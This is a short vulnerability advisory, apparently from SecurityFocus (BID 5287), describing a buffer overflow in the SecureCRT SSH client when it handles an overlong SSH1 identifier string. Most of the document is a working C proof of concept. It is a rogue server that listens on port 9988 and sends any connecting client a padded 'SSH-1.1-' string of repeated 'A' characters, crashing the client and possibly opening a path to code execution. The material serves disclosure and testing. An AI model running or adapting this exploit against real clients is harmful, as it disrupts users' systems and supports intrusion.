source: http://www.securityfocus.com/bid/5287/info

The SecureCRT client is prone to a buffer-overflow condition when attempting to handle an overly long SSH1 protocol identifier string. Reportedly, an attacker can exploit this issue via a malicious server. 

Exploiting this issue may allow an attacker to execute arbitrary code or may cause the client to crash.

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 9988

int main(int argc, char **argv) {
    int s, n, i, sz = sizeof(struct sockaddr_in);
    struct sockaddr_in local, whatever;
    char payload[510];

    strcpy(payload, "SSH-1.1-");
    for (i = 8; i < 508; i++)
        payload[i] = 'A';
    payload[508] = '\n';
    payload[509] = '\0';

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        return 1;
    }
    local.sin_family = AF_INET;
    local.sin_port = htons(PORT);
    local.sin_addr.s_addr = INADDR_ANY;
    memset(&(local.sin_zero), 0, 8);
    if (bind(s, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1) 
{
        perror("bind");
        return 1;
    }
    if (listen(s, 2) == -1)  {
        perror("listen");
        return 1;
    }
    printf("waiting for connection...\n");
    if ((n = accept(s, (struct sockaddr *)&whatever, &sz)) == -1) {
        perror("accept");
        return 1;
    }
    printf("client connected\n");
    if (send(n, payload, sizeof(payload) - 1, 0) == -1) {
        perror("send");
        return 1;
    }
    printf("sent string: [%s]\n", payload);
    close(n);
    close(s);
    return 0;
}